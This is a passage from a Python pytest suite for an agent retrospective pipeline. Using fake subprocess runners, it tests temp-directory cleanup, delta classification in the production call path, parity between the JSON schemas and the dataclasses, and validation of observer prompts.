    seen_temp_dir: dict[str, Path] = {}

    def _git_runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        seen_temp_dir["exists_during_run"] = (temp_base / "agent-retrospective-run-run-temp-1").is_dir()
        return subprocess.CompletedProcess(argv, returncode=0, stdout=_FULL_SHA + "\n", stderr="")

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(
            argv, returncode=0, stdout="", stderr="boom"
        )  # forces api_error -> ObserverWaveFailed

    with pytest.raises(rr.ObserverWaveFailed):
        rr.run_cli(
            repo_root=repo_root,
            repository_id="squne121/loop-protocol",
            target_issue=2237,
            request_id="req",
            idempotency_key="idem",
            schema_dir=schema_dir,
            # Issue #2345 fix_delta P1/P2: `prompts=None` exercises the
            # production default-prompt path (built from real ctx/plan
            # identity); `_runner` below forces `api_error` regardless of
            # prompt content, so `ObserverWaveFailed` is still reached.
            prompts=None,
            runner=_runner,
            git_runner=_git_runner,
            run_id="run-temp-1",
            temp_base_dir=temp_base,
        )
    assert seen_temp_dir["exists_during_run"] is True
    # AND cleanup still ran (fail-closed phase failure does not leak the dir)
    assert not (temp_base / "agent-retrospective-run-run-temp-1").exists()

    # cleanup failure is surfaced, not swallowed: if the directory is
    # removed out-of-band before `run_scoped_temp_dir`'s own `finally`
    # cleanup runs, `shutil.rmtree` (no `ignore_errors=True`) raises instead
    # of the context manager silently reporting success.
    with pytest.raises(FileNotFoundError):
        with rr.run_scoped_temp_dir("run-vanish", base_dir=tmp_path) as path:
            shutil.rmtree(path)  # simulate an external actor removing it mid-run


# ---------------------------------------------------------------------------
# In Scope: manual trigger preflight (not a numbered AC's own -k target, but
# exercised as a bundled scenario)
# ---------------------------------------------------------------------------


def test_manual_trigger_preflight_rejects_non_git_root(tmp_path: Path) -> None:
    with pytest.raises(ValueError):
        rr.manual_trigger_preflight(repo_root=tmp_path)


def test_manual_trigger_preflight_accepts_git_root() -> None:
    repo_root = _SCRIPTS_DIR.parents[3]
    rr.manual_trigger_preflight(repo_root=repo_root)  # no raise


# ---------------------------------------------------------------------------
# fix_delta iteration-4, Warning 1: compute_delta() actually wired into the
# production execute_run()/run_cli() -> finalize() call graph (previously
# only unit-tested standalone, never invoked from the production path)
# ---------------------------------------------------------------------------


def _make_execute_run_evaluator_invoke(candidate_records: list[dict[str, Any]]):
    def _invoke(request: rr.EvaluatorRequest) -> rr.AgentInvocationResult:
        evaluation = rr.Evaluation(
            run_id=request.run_id,
            base_sha=request.base_sha,
            source_set_digest=request.source_set_digest,
            candidate_records=candidate_records,
            evidence_ref="evidence://evaluation",
        )
        return _ok_agent_result(json.loads(evaluation.to_wire()))

    return _invoke


def test_compute_delta_wired_into_production_publish_path_recurrent() -> None:
    # GIVEN a PreviousStateProvider seeded with a previously-resolved finding
    resolved_fixture = _validate_mod.load_fixture("agent_improvement_candidate_v1.finding_contract.resolved.valid.json")
    current_recurrence = copy.deepcopy(resolved_fixture)
    repository_id = "squne121/loop-protocol"
    provider = rr.FixturePreviousStateProvider(
        fixtures={
            (repository_id, rr.DEFAULT_PREVIOUS_STATE_SCOPE): rr.PreviousStateResult(
                status="available", previous_run_ref="run-0", candidates=[resolved_fixture], read_version="v1"
            )
        }
    )
    call_log: list[str] = []
    expected_digest = rr.compute_source_set_digest([_fake_collector_result("repository", _FULL_SHA).observation])

    # WHEN execute_run() (the production composition, not a standalone
    # compute_delta() unit test) runs the full pipeline with that provider
    publish_request = rr.execute_run(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        observer_requests=[_observer_request("retrospective-runtime-observer")],
        invoke=_make_observer_invoke("run-delta-1", expected_digest, call_log),
        invoke_evaluator=_make_execute_run_evaluator_invoke([current_recurrence]),
        repository_id=repository_id,
        target_issue=2237,
        request_id="req-delta-1",
        idempotency_key="idem-delta-1",
        run_id="run-delta-1",
        previous_state_provider=provider,
    )

    # THEN the PublishRequest actually returned by the production call graph
    # (not a hand-called compute_delta()) carries the classified delta
    assert publish_request.delta_results == [
        {
            "finding_identity": resolved_fixture["finding_contract"]["identity"]["value"],
            "evaluation_status": "classified",
            "delta_status": "recurrent",
        }
    ]


def test_compute_delta_wired_into_production_publish_path_forces_indeterminate() -> None:
    # GIVEN a PreviousStateProvider reporting incomplete ("partial") coverage
    new_fixture = _validate_mod.load_fixture("agent_improvement_candidate_v1.finding_contract.new.valid.json")
    repository_id = "squne121/loop-protocol"
    provider = rr.FixturePreviousStateProvider(
        fixtures={
            (repository_id, rr.DEFAULT_PREVIOUS_STATE_SCOPE): rr.PreviousStateResult(
                status="partial", previous_run_ref="run-0", candidates=[new_fixture], read_version="v1"
            )
        }
    )
    call_log: list[str] = []
    expected_digest = rr.compute_source_set_digest([_fake_collector_result("repository", _FULL_SHA).observation])

    # WHEN the production call graph runs with that (indeterminate-forcing)
    # provider state
    publish_request = rr.execute_run(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        observer_requests=[_observer_request("retrospective-runtime-observer")],
        invoke=_make_observer_invoke("run-delta-2", expected_digest, call_log),
        invoke_evaluator=_make_execute_run_evaluator_invoke([new_fixture]),
        repository_id=repository_id,
        target_issue=2237,
        request_id="req-delta-2",
        idempotency_key="idem-delta-2",
        run_id="run-delta-2",
        previous_state_provider=provider,
    )

    # THEN the PublishRequest carries the forced-indeterminate classification
    # end-to-end -- an indeterminate evaluation is never reported "resolved"
    assert publish_request.delta_results == [
        {
            "finding_identity": new_fixture["finding_contract"]["identity"]["value"],
            "evaluation_status": "indeterminate",
            "delta_status": None,
            "indeterminate_reason": "source_partial",
        }
    ]


def test_compute_delta_wired_into_production_publish_path_default_provider_is_new() -> None:
    # GIVEN no previous_state_provider is injected (the common/default case)
    call_log: list[str] = []
    expected_digest = rr.compute_source_set_digest([_fake_collector_result("repository", _FULL_SHA).observation])

    # WHEN execute_run() runs without wiring a PreviousStateProvider
    publish_request = rr.execute_run(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        observer_requests=[_observer_request("retrospective-runtime-observer")],
        invoke=_make_observer_invoke("run-delta-3", expected_digest, call_log),
        invoke_evaluator=_make_execute_run_evaluator_invoke([_new_candidate()]),
        repository_id="squne121/loop-protocol",
        target_issue=2237,
        request_id="req-delta-3",
        idempotency_key="idem-delta-3",
        run_id="run-delta-3",
    )

    # THEN the default FixturePreviousStateProvider(fixtures={}) still runs
    # (a no-op default, not an unwired/absent field) and classifies as "new"
    assert publish_request.delta_results == [
        {
            "finding_identity": _new_candidate()["finding_contract"]["identity"]["value"],
            "evaluation_status": "classified",
            "delta_status": "new",
        }
    ]


def test_compute_delta_wired_into_production_publish_path_run_cli(tmp_path: Path) -> None:
    # GIVEN the same production entrypoint main()/run_cli() invokes, with a
    # PreviousStateProvider that reports the finding as previously resolved
    repo_root = _SCRIPTS_DIR.parents[3]
    schema_dir = tmp_path / "schemas"
    schema_dir.mkdir()
    (schema_dir / "observer_result_v1.schema.json").write_text("{}", encoding="utf-8")
    (schema_dir / "evaluation_result_v1.schema.json").write_text("{}", encoding="utf-8")

    def _git_runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(argv, returncode=0, stdout=_FULL_SHA + "\n", stderr="")

    resolved_fixture = _validate_mod.load_fixture("agent_improvement_candidate_v1.finding_contract.resolved.valid.json")
    current_recurrence = copy.deepcopy(resolved_fixture)
    repository_id = "squne121/loop-protocol"
    provider = rr.FixturePreviousStateProvider(
        fixtures={
            (repository_id, rr.DEFAULT_PREVIOUS_STATE_SCOPE): rr.PreviousStateResult(
                status="available", previous_run_ref="run-0", candidates=[resolved_fixture], read_version="v1"
            )
        }
    )

    real_observation = rr.build_repository_collector(repo_root)(_FULL_SHA).observation
    expected_digest = rr.compute_source_set_digest([real_observation])

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        agent_name = argv[argv.index("--agent") + 1]
        if agent_name == "retrospective-evaluator":
            evaluator_request = rr.EvaluatorRequest.from_wire(kwargs["input"])
            evaluation = rr.Evaluation(
                run_id=evaluator_request.run_id,
                base_sha=_FULL_SHA,
                source_set_digest=evaluator_request.source_set_digest,
                candidate_records=[current_recurrence],
                evidence_ref="e",
            )
            return subprocess.CompletedProcess(
                argv, returncode=0, stdout=json.dumps(_wrapper_payload(json.loads(evaluation.to_wire()))), stderr=""
            )
        bundle = rr.EvidenceBundle(
            run_id=kwargs["env"].get("AGENT_RETROSPECTIVE_RUN_ID", ""),
            base_sha=kwargs["env"].get("AGENT_RETROSPECTIVE_BASE_SHA", ""),
            source_set_digest=expected_digest,
            observer_id=agent_name,
            evidence_ref=f"evidence://{agent_name}",
            findings=[{"claim": f"finding from {agent_name}", "claim_class": "process"}],
        )
        return subprocess.CompletedProcess(
            argv, returncode=0, stdout=json.dumps(_wrapper_payload(json.loads(bundle.to_wire()))), stderr=""
        )

    # WHEN run_cli() -- the exact function main() calls -- runs with that
    # provider injected
    publish_request = rr.run_cli(
        repo_root=repo_root,
        repository_id=repository_id,
        target_issue=2237,
        request_id="req-cli-delta-1",
        idempotency_key="idem-cli-delta-1",
        schema_dir=schema_dir,
        # Issue #2345 fix_delta P1/P2: `prompts=None` exercises the
        # production default-prompt path; `_runner` above derives observer
        # identity from `kwargs["env"]`, not prompt content.
        prompts=None,
        runner=_runner,
        git_runner=_git_runner,
        run_id="run-cli-delta-1",
        temp_base_dir=tmp_path,
        previous_state_provider=provider,
    )

    # THEN the PublishRequest run_cli() returns (the same object main()
    # prints to stdout) carries the delta classification
    assert publish_request.delta_results == [
        {
            "finding_identity": resolved_fixture["finding_contract"]["identity"]["value"],
            "evaluation_status": "classified",
            "delta_status": "recurrent",
        }
    ]




# ---------------------------------------------------------------------------
# AC4 (Issue #2301): committed scripts/schemas/ canonical JSON Schema assets
# -- the exact files build_observer_requests()/run_cli() point --schema-dir
# at by default (_SCRIPTS_DIR / "schemas"). Parity-checked against the
# EvidenceBundle/Evaluation wire-contract dataclasses that are the actual
# ground truth for the business payload shape (never a private duplicate).
# ---------------------------------------------------------------------------

_SCHEMA_DIR = _SCRIPTS_DIR / "schemas"


def _load_schema(filename: str) -> dict[str, Any]:
    return json.loads((_SCHEMA_DIR / filename).read_text(encoding="utf-8"))


def test_observer_result_schema_asset_exists_and_is_valid_json_schema() -> None:
    schema = _load_schema("observer_result_v1.schema.json")
    jsonschema.Draft7Validator.check_schema(schema)


def test_evaluation_result_schema_asset_exists_and_is_valid_json_schema() -> None:
    schema = _load_schema("evaluation_result_v1.schema.json")
    jsonschema.Draft7Validator.check_schema(schema)


def test_observer_result_schema_required_fields_match_evidence_bundle_dataclass() -> None:
    schema = _load_schema("observer_result_v1.schema.json")
    dataclass_fields = {f.name for f in dataclasses.fields(rr.EvidenceBundle)}
    assert set(schema["required"]) == dataclass_fields
    assert set(schema["properties"].keys()) == dataclass_fields


def test_evaluation_result_schema_required_fields_match_evaluation_dataclass() -> None:
    schema = _load_schema("evaluation_result_v1.schema.json")
    dataclass_fields = {f.name for f in dataclasses.fields(rr.Evaluation)}
    assert set(schema["required"]) == dataclass_fields
    assert set(schema["properties"].keys()) == dataclass_fields


def test_observer_result_schema_validates_real_evidence_bundle_wire_payload() -> None:
    schema = _load_schema("observer_result_v1.schema.json")
    bundle = rr.EvidenceBundle(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest=_DIGEST,
        observer_id="retrospective-runtime-observer",
        evidence_ref="evidence://x",
        findings=[{"claim": "observed something", "claim_class": "process"}],
    )
    payload = json.loads(bundle.to_wire())
    jsonschema.validate(payload, schema)


def test_evaluation_result_schema_validates_real_evaluation_wire_payload() -> None:
    schema = _load_schema("evaluation_result_v1.schema.json")
    evaluation = rr.Evaluation(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest=_DIGEST,
        candidate_records=[],
        evidence_ref="evidence://x",
    )
    payload = json.loads(evaluation.to_wire())
    jsonschema.validate(payload, schema)


def test_build_observer_requests_default_schema_dir_points_at_committed_schemas(tmp_path: Path) -> None:
    """The `--schema-dir` default (`_SCRIPTS_DIR / "schemas"`) that
    `run_cli()`/`main()` use in production must resolve to the exact
    directory containing the two schema assets this Issue adds -- not a
    stale/placeholder path."""
    # Issue #2345 fix_delta P2: build_observer_requests() now rejects an
    # empty/missing prompt per manifest entry -- supply a valid non-empty
    # prompt for every observer_id so this test only exercises what it
    # actually asserts (schema_dir resolution).
    valid_prompts = {spec.observer_id: f"prompt for {spec.observer_id}" for spec in rr.EXPECTED_OBSERVER_MANIFEST}
    requests = rr.build_observer_requests(schema_dir=_SCHEMA_DIR, cwd=str(tmp_path), prompts=valid_prompts)
    assert requests
    for request in requests:
        assert Path(request.json_schema_path) == _SCHEMA_DIR / "observer_result_v1.schema.json"
        assert Path(request.json_schema_path).is_file()


# ---------------------------------------------------------------------------
# Issue #2345 fix_delta (OWNER review
# https://github.com/squne121/loop-protocol/pull/2347#issuecomment-5417901341,
# P2 item 4): hermetic (non-live, fake-runner-based) regression coverage
# for the `--prompts-file`-omitted default-prompt path.
# ---------------------------------------------------------------------------


def test_default_observer_prompts_use_real_run_identity_not_placeholder(tmp_path: Path) -> None:
    """(a) every default observer prompt `run_cli()` generates when
    `prompts=None` (the `--prompts-file`-omitted case) is non-empty, and
    (b) reflects the REAL run identity (`ctx.run_id`/`ctx.base_sha`/
    `plan.source_set_digest`) rather than a fixed placeholder that could
    never legitimately match -- the construct-to-fail design this
    fix_delta replaces (see `_default_observer_prompt`'s docstring). The
    production `run_cli()` call graph completing end-to-end into a real
    `PublishRequest` (never raising `ObserverWaveFailed` at
    `observer_run_id_mismatch`) is itself proof the threaded identity
    matched."""
    repo_root = _SCRIPTS_DIR.parents[3]
    schema_dir = tmp_path / "schemas"
    schema_dir.mkdir()
    (schema_dir / "observer_result_v1.schema.json").write_text("{}", encoding="utf-8")
    (schema_dir / "evaluation_result_v1.schema.json").write_text("{}", encoding="utf-8")

    def _git_runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(argv, returncode=0, stdout=_FULL_SHA + "\n", stderr="")

    real_observation = rr.build_repository_collector(repo_root)(_FULL_SHA).observation
    expected_digest = rr.compute_source_set_digest([real_observation])

    captured_prompts: dict[str, str] = {}

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        agent_name = argv[argv.index("--agent") + 1]
        if agent_name == "retrospective-evaluator":
            evaluator_request = rr.EvaluatorRequest.from_wire(kwargs["input"])
            evaluation = rr.Evaluation(
                run_id=evaluator_request.run_id,
                base_sha=_FULL_SHA,
                source_set_digest=evaluator_request.source_set_digest,
                candidate_records=[],
                evidence_ref="e",
            )
            return subprocess.CompletedProcess(
                argv, returncode=0, stdout=json.dumps(_wrapper_payload(json.loads(evaluation.to_wire()))), stderr=""
            )
        captured_prompts[agent_name] = kwargs["input"]
        bundle = rr.EvidenceBundle(
            run_id=kwargs["env"].get("AGENT_RETROSPECTIVE_RUN_ID", ""),
            base_sha=kwargs["env"].get("AGENT_RETROSPECTIVE_BASE_SHA", ""),
            source_set_digest=expected_digest,
            observer_id=agent_name,
            evidence_ref="evidence://default",
            findings=[],
        )
        return subprocess.CompletedProcess(
            argv, returncode=0, stdout=json.dumps(_wrapper_payload(json.loads(bundle.to_wire()))), stderr=""
        )

    publish_request = rr.run_cli(
        repo_root=repo_root,
        repository_id="squne121/loop-protocol",
        target_issue=2237,
        request_id="req-default-prompt-1",
        idempotency_key="idem-default-prompt-1",
        schema_dir=schema_dir,
        prompts=None,
        runner=_runner,
        git_runner=_git_runner,
        run_id="run-default-prompt-1",
        temp_base_dir=tmp_path,
    )

    # THEN the real production call graph completed end-to-end into a
    # PublishRequest -- it never raised ObserverWaveFailed at
    # observer_run_id_mismatch, proving the default-prompt path's
    # run_id/base_sha/source_set_digest genuinely matched this run.
    assert isinstance(publish_request, rr.PublishRequest)
    assert sorted(captured_prompts) == sorted(spec.observer_id for spec in rr.EXPECTED_OBSERVER_MANIFEST)
    for observer_id, prompt in captured_prompts.items():
        # (a) never empty
        assert prompt.strip(), f"default prompt for {observer_id} must be non-empty"
        # (b) reflects the REAL run identity, never a fixed placeholder
        assert "run-default-prompt-1" in prompt
        assert _FULL_SHA in prompt
        assert expected_digest in prompt
        assert "unset-default-prompt-run-id" not in prompt


def test_build_observer_requests_rejects_missing_or_empty_prompt() -> None:
    """(c) Issue #2345 fix_delta P2 item 3: a partial/incomplete
    caller-supplied `prompts` dict -- a missing manifest key, or an
    empty/whitespace-only string value -- is rejected locally with a typed
    `invalid_observer_prompts` `WireContractError`, never silently
    defaulted to `""` and passed through toward the `claude` CLI (the
    original empty-prompt bug this Issue exists to fix)."""
    complete_prompts = {spec.observer_id: "real prompt text" for spec in rr.EXPECTED_OBSERVER_MANIFEST}
    missing_key_id = rr.EXPECTED_OBSERVER_MANIFEST[0].observer_id

    partial_prompts = {k: v for k, v in complete_prompts.items() if k != missing_key_id}
    with pytest.raises(rr.WireContractError) as missing_key_excinfo:
        rr.build_observer_requests(schema_dir=_SCHEMA_DIR, cwd=".", prompts=partial_prompts)
    assert missing_key_excinfo.value.reason_code == "invalid_observer_prompts"

    empty_value_prompts = dict(complete_prompts)
    empty_value_prompts[missing_key_id] = "   "  # whitespace-only -- empty after strip()
    with pytest.raises(rr.WireContractError) as empty_value_excinfo:
        rr.build_observer_requests(schema_dir=_SCHEMA_DIR, cwd=".", prompts=empty_value_prompts)
    assert empty_value_excinfo.value.reason_code == "invalid_observer_prompts"


def test_build_observer_requests_rejects_non_string_prompt_value() -> None:
    """PR #2358 fix_delta (OWNER review
    https://github.com/squne121/loop-protocol/pull/2358#issuecomment-5437414255,
    P2) regression test: a non-string `--prompts-file` value for a
    manifest `observer_id` (e.g. JSON `null` decoded to Python `None`) must
    be rejected the SAME typed, fail-closed way as a missing/empty prompt
    -- a `WireContractError` with `reason_code="invalid_observer_prompts"`
    -- never an untyped `AttributeError` from `bind_observer_prompt()`'s
    `task_prompt.strip()` (the previous `str(value).strip()`-based check
    coerced `None` to the non-empty string `"None"` FIRST, so it spuriously
    passed validation)."""
    non_string_prompts: dict[str, Any] = {
        spec.observer_id: "real prompt text" for spec in rr.EXPECTED_OBSERVER_MANIFEST
    }
    target_id = rr.EXPECTED_OBSERVER_MANIFEST[0].observer_id
    non_string_prompts[target_id] = None  # e.g. `{"observer_id": null}` in --prompts-file JSON

    with pytest.raises(rr.WireContractError) as excinfo:
        rr.build_observer_requests(schema_dir=_SCHEMA_DIR, cwd=".", prompts=non_string_prompts)
    assert excinfo.value.reason_code == "invalid_observer_prompts"
